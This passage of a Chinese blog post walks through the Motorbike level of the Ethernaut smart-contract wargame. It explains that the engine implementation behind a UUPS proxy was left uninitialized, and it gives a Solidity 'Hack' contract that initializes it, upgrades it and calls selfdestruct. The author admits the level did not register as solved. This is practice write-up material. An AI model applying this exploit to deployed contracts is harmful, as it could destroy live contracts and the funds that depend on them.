punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token function">_upgradeToAndCall</span><span class="token punctuation">(</span>newImplementation<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre>    <span class="token comment">// Restrict to upgrader role</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_authorizeUpgrade</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">view</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> upgrader<span class="token punctuation">,</span> <span class="token string">"Can't upgrade"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="76"></td><td><pre></pre></td></tr><tr><td data-num="77"></td><td><pre>    <span class="token comment">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_upgradeToAndCall</span><span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        <span class="token comment">// Initial upgrade and setup call</span></pre></td></tr><tr><td data-num="80"></td><td><pre>        <span class="token function">_setImplementation</span><span class="token punctuation">(</span>newImplementation<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>            <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> newImplementation<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>            <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"Call failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="86"></td><td><pre></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token comment">// Stores a new address in the EIP1967 implementation slot.</span></pre></td></tr><tr><td data-num="88"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">_setImplementation</span><span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>Address<span class="token punctuation">.</span><span class="token function">isContract</span><span class="token punctuation">(</span>newImplementation<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC1967: new implementation is not a contract"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="90"></td><td><pre></pre></td></tr><tr><td data-num="91"></td><td><pre>        AddressSlot <span class="token keyword">storage</span> r<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>        <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>            r_slot <span class="token operator">:=</span> _IMPLEMENTATION_SLOT</pre></td></tr><tr><td data-num="94"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>        r<span class="token punctuation">.</span>value <span class="token operator">=</span> newImplementation<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="96"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="97"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Analyse<br>本题要求是 你能自毁 (selfdestruct) 它的引擎并使摩托车无法使用吗？<br>初始化实例以后，控制台的 contract 是指 Motorbike 合约，通过构造方法我们看到在插槽_IMPLEMENTATION_SLOT 的位置部署了一个实现合约，通过读取 Storage 查看_IMPLEMENTATION_SLOT 位置的合约地址。然后再看对应合约地址上 upgrader 和 horsePower 发现都是 0。所以可以确定_IMPLEMENTATION_SLOT 位置的合约并没有调用 initialize 进行初始化。</p><p>那么我们就可以用自己的合约进行初始化，然后升级合约，用我们自己的合约调用自毁函数。</p><p>Attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">&lt;</span><span class="token version number">0.7.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">IEngine</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">upgrader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">upgradeToAndCall</span><span class="token punctuation">(</span><span class="token builtin">address</span> newImplementation<span class="token punctuation">,</span> <span class="token builtin">bytes</span> <span class="token keyword">memory</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span>  <span class="token comment">// 修正此行</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token comment">// 合约构造函数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span>IEngine target<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        target<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        target<span class="token punctuation">.</span><span class="token function">upgradeToAndCall</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"self()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="16"></td><td><pre>        </pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">self</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>但是不知道为什么不显示通过。</p><div class="tags"><a href="/tags/blockchain/" rel="tag"><i class="ic i-tag"></i>blockchain</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2025-07-16 20:03:22" itemprop="dateModified" datetime="2025-07-16T20:03:22+08:00">2025-07-16</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img loading="lazy" src="/assets/wechatpay.png" alt="Chain Roame 微信支付"><p>微信支付</p></div><div><img loading="lazy" src="/assets/alipay.png" alt="Chain Roame 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>Chain Roame<i class="ic i-at"><em>@</em></i>Chain Roame</li><li class="link"><strong>本文链接：</strong><a href="https://chain-roamer.github.io/2025/07/16/Ehternet/" title="Ehternaut">https://chain-roamer.github.io/2025/07/16/Ehternet/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"></div><div class="item right"><a href="/2025/07/16/Python/" rel="next" itemprop="url" data-background-image="https:&#x2F;&#x2F;www.dmoe.cc&#x2F;random.php?170540" title="Python"><span class="type">下一篇</span><h3>Python</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#force"><span class="toc-number">1.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#king"><span class="toc-number">2.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re-entrancy"><span class="toc-number">3.</span> <span class="toc-text">Re-entrancy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#elevator"><span class="toc-number">4.</span> <span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#privacy"><span class="toc-number">5.</span> <span class="toc-text">Privacy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gatekeeper-two"><span class="toc-number">6.</span> <span class="toc-text">Gatekeeper Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#naught-coin"><span class="toc-number">7.</span> <span class="toc-text">Naught Coin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preservation"><span class="toc-number">8.</span> <span class="toc-text">Preservation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#recovery"><span class="toc-number">9.</span> <span class="toc-text">Recovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#magicnumber"><span class="toc-number">10.</span> <span class="toc-text">MagicNumber</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alien-codex"><span class="toc-number">11.</span> <span class="toc-text">Alien Codex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#denial"><span class="toc-number">12.</span> <span class="toc-text">Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dex"><span class="toc-number">13.</span> <span class="toc-text">Dex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dex-two"><span class="toc-number">14.</span> <span class="toc-text">Dex Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#motorbike"><span class="toc-number">15.</span> <span class="toc-text">Motorbike</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2025/07/16/Ehternet/" rel="bookmark" title="Ehternaut">Ehternaut</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="Chain Roame" src="/assets/avatar.jpg"><p class="name" itemprop="name">Chain Roame</p><div class="description" itemprop="description">从零到中心化的旅程</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">2</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">1</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">1</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/yourname" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;yourname"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/bangumis/" rel="section"><i class="ic i-bilibili"></i>bangumis</a></li><li class="item dropdown"><a href="#" onclick="return!1"><i class="ic i-user"></i>关于</a><ul class="submenu"></ul></li><li class="item dropdown"><a href="#" onclick="return!1"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2025/07/16/Python/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2025/07/16/Python/">Python</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/blockchain/" title="分类于blockchain">blockchain</a></div><span><a href="/2025/07/16/Ehternet/">Ehternaut</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">Chain Roame @ Chain Roame</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">47k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">42 分钟</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
    ispost: true,
    path: `2025/07/16/Ehternet/`,
    favicon: {
        show: `（●´3｀●）やれやれだぜ`,
        hide: `(´Д｀)大変だ！`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    nocopy: "false",
    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    }
};</script><script src="/js/siteInit.js?v=0.5.1" type="module" fetchpriority="high" defer></script></body></html><!-- rebuild by hrmmi -->